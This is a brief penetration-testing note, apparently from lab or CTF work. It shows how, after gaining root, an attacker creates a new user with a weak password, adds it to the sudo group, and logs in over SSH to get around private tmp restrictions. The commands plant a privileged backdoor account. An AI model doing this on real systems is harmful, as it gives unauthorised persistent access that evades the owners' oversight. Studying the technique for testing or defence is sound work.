# Escaping Private tmp protection

If private tmp protection is active, it can restrict the content of tmp directory to other users.

To bypass this, we should create a new root users and login to SSH to get a proper shell.

1. Create you'r new user.
```bash
root@sinhack03:/tmp# adduser v0lk3n
adduser v0lk3n
Adding user `v0lk3n' ...
Adding new group `v0lk3n' (1001) ...
Adding new user `v0lk3n' (1001) with group `v0lk3n' ...
Creating home directory `/home/v0lk3n' ...
Copying files from `/etc/skel' ...
New password: pwned
BAD PASSWORD: The password is shorter than 8 characters
Retype new password: pwned

passwd: password updated successfully
```

2. Add the user to sudo group. (to give him root permissions)

```bash
root@sinhack03:/tmp# usermod -aG sudo v0lk3n
usermod -aG sudo v0lk3n
root@sinhack03:/tmp# 
```

3. Once our user created, let's ssh to it.

```bash
┌──(v0lk3n㉿K4l1-L1nux)-[~]
└─$ ssh v0lk3n@192.168.x.x
v0lk3n@192.168.x.x's password:
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-111-generic x86_64)
...
v0lk3n@web05:~$ whoami
v0lk3n
v0lk3n@web05:~$ groups
v0lk3n sudo
```

Now you should be able to access the whole content of tmp folder.
